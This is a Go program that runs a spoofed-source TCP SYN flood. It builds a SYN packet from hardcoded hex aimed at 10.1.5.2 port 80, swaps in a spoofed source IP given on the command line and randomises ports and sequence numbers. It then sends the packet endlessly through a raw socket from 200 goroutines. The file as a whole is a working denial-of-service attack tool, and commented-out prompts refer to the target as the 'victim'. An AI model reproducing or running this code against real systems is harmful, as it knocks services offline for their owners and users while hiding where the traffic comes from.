package main

import (
	"encoding/hex"
	"fmt"
	"math/rand"
	"net"
	"os"
	"os/signal"
	"syscall"

	"github.com/google/gopacket"
	"github.com/google/gopacket/layers"
	//"net"
)

var packetCounter uint64 = 0

func init() {
	c := make(chan os.Signal)
	signal.Notify(c, os.Interrupt, syscall.SIGTERM)
	go func() {
		<-c
		// Run Cleanup
		os.Exit(1)
	}()
}

func main() {

	if len(os.Args) < 2 {
		fmt.Println("Missing IP argument. Exiting.")
		return
	}

	spoofed_ip := os.Args[1]

	// reader := bufio.NewReader(os.Stdin)
	// fmt.Print("Enter IP address to spoof: ")
	// ip, _ = reader.ReadString('\n')
	// fmt.Print("Enter IP address to target (default 10.1.5.2): ")
	// victim_ip, _ = reader.readi("\n")
	// fmt.Print("Enter IP address to target (default 80): ")
	// victim_port, _ = reader.ReadString("\n")
	for i := 0; i < 200; i++ {
		go flood(spoofed_ip)
	}
	fmt.Println("Press Enter to terminate the flood")
	fmt.Scanln()
	fmt.Println(packetCounter)
}

func flood(spoofed_ip string) {
	packetData, _ := hex.DecodeString("4500003c4ffd40003c06d3b90a0102020a010502abd400507c4d125e00000000a002faf088fe0000020405b40402080a420b2c300000000001030307")

	packet := gopacket.NewPacket(packetData, layers.LayerTypeIPv4, gopacket.Default)

	fd, err := syscall.Socket(syscall.AF_INET, syscall.SOCK_RAW, syscall.IPPROTO_RAW)
	check(err)
	for {
		if ipLayer := packet.Layer(layers.LayerTypeIPv4); ipLayer != nil {
			ip := ipLayer.(*layers.IPv4)
			ip.SrcIP = net.ParseIP(spoofed_ip)

			if tcpLayer := packet.Layer(layers.LayerTypeTCP); tcpLayer != nil {
				tcp := tcpLayer.(*layers.TCP)
				tcp.SrcPort = layers.TCPPort(rand.Intn(65536-1024) + 1024)
				tcp.Seq = rand.Uint32()
				options := gopacket.SerializeOptions{
					ComputeChecksums: true,
					FixLengths:       true,
				}
				tcp.SetNetworkLayerForChecksum(ip)

				buffer := gopacket.NewSerializeBuffer()
				err := gopacket.SerializePacket(buffer, options, packet)
				if err != nil {
					panic(err)
				}

				outgoingPacket := buffer.Bytes()
				var dest [4]byte
				copy(dest[:], ip.DstIP)

				check(err)
				addr := syscall.SockaddrInet4{
					Port: int(tcp.DstPort),
					Addr: dest,
				}
				//err = syscall.Bind(fd, addr)

				err = syscall.Sendto(fd, outgoingPacket, 0, &addr)
				check(err)
				packetCounter++
			}
		}
	}

}

func check(err error) {
	if err != nil {
		fmt.Println(err)
	}
}
